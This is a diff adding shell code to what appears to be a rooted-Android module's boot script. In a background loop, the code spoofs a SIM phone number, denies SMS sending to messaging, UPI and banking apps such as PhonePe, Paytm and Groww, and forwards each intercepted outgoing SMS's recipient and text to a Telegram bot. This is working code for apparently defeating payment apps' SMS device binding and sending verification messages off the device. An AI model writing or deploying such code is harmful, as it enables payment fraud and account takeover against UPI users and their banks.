@@ -159,3 +159,59 @@ hivirtus_boot_activate_overlay &
     sleep 2
   done
 ) &
+
+# Mock SIM ON → Messages/UPI ko SEND_SMS deny (root se — overlay root ke bina bhi)
+enforce_sms_block() {
+  if [ ! -f /data/local/tmp/hivirtus_spoof_phone.txt ]; then
+    SPOOF=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$CONFIG" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+    [ -n "$SPOOF" ] || return 0
+  fi
+  for pkg in com.google.android.apps.messaging com.android.mms com.android.mms.service \
+    com.samsung.android.messaging com.yespay.next com.yesbank.yespay \
+    com.kreditbee.android com.groww.app com.nextbillion.groww \
+    com.herofincorp.diyjourneys com.phonepe.app net.one97.paytm; do
+    appops set "$pkg" SEND_SMS deny 2>/dev/null
+    cmd appops set "$pkg" SEND_SMS deny 2>/dev/null
+  done
+  echo 1 > /data/local/tmp/hivirtus_phone_sms_denied.flag
+  chmod 644 /data/local/tmp/hivirtus_phone_sms_denied.flag 2>/dev/null
+}
+
+forward_blocked_telegram() {
+  FLAG="/data/local/tmp/hivirtus_outgoing_blocked.flag"
+  [ ! -f "$FLAG" ] && return 0
+  TG="/data/local/tmp/hivirtus_telegram_credentials.json"
+  [ ! -f "$TG" ] && TG="$MODDIR/telegram_credentials.json"
+  [ ! -f "$TG" ] && return 0
+  LINE=$(cat "$FLAG" 2>/dev/null | head -n1)
+  [ -z "$LINE" ] && return 0
+  DEST="${LINE%%|*}"
+  BODY="${LINE#*|}"
+  TOKEN=$(grep '"telegram_bot_token"' "$TG" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+  CHAT=$(grep '"telegram_chat_id"' "$TG" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
+  [ -z "$TOKEN" ] || [ -z "$CHAT" ] && return 0
+  TEXT="📱 Intercepted Outgoing SMS
+@hivirtus @liqdy
+
+To: ${DEST}
+
+Body:
+${BODY}"
+  if command -v curl >/dev/null 2>&1; then
+    curl -s -m 20 -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
+      --data-urlencode "chat_id=${CHAT}" \
+      --data-urlencode "text=${TEXT}" >/dev/null 2>&1
+  fi
+  am broadcast -a com.hivirtus.zygiskmode.OUTGOING_BLOCKED \
+    -n com.hivirtus.zygiskmode/.BlockedSmsReceiver \
+    --es dest "$DEST" --es body "$BODY" 2>/dev/null
+  rm -f "$FLAG"
+}
+
+(
+  while true; do
+    enforce_sms_block
+    forward_blocked_telegram
+    sleep 2
+  done
+) &
